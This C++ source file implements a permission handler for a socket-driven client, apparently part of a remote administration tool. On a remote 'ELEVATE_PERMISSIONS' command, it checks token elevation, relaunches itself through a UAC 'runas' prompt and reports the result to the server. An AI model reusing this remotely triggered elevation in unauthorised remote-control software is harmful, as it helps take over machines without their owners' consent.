#include "Permission.h"

BOOL Permission::hasAdminPermission() {
    BOOL fRet = FALSE;
    HANDLE hToken = nullptr;
    if( OpenProcessToken( GetCurrentProcess( ),TOKEN_QUERY,&hToken ) ) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof( TOKEN_ELEVATION );
        if( GetTokenInformation( hToken, TokenElevation, &Elevation, sizeof( Elevation ), &cbSize ) ) {
            fRet = (BOOL) Elevation.TokenIsElevated;
        }
    }
    if( hToken ) {
        CloseHandle( hToken );
    }
    return fRet;
}

BOOL Permission::elevatePermissions() {
    if (hasAdminPermission() == 0) {
        char szPath[MAX_PATH];
        if (GetModuleFileName(nullptr, szPath, ARRAYSIZE(szPath))) {
            SHELLEXECUTEINFO sei = {sizeof(sei)};
            sei.lpVerb = "runas";
            sei.lpFile = szPath;
            sei.hwnd = nullptr;
            sei.nShow = SW_NORMAL;
            return ShellExecuteEx(&sei);
        }
    }
    return 2;
}

void Permission::sendElevatedPermissions() {
    nlohmann::json json;
    BOOL result = elevatePermissions();
    json["RESPONSE"] = "PERMISSIONS";
    json["result"] = result;
    clientSocket.sendMessage(json);
    if (result == 1) {
        exit(0);
    }
}

Permission::Permission(ClientSocket &clientSocket) : Handler(clientSocket) {
    ActionMap& actionMap = clientSocket.getActionMap();
    actionMap["ELEVATE_PERMISSIONS"] = [&](nlohmann::json& json) {
        threadGen.runInNewThread(this, &Permission::sendElevatedPermissions);
    };

}


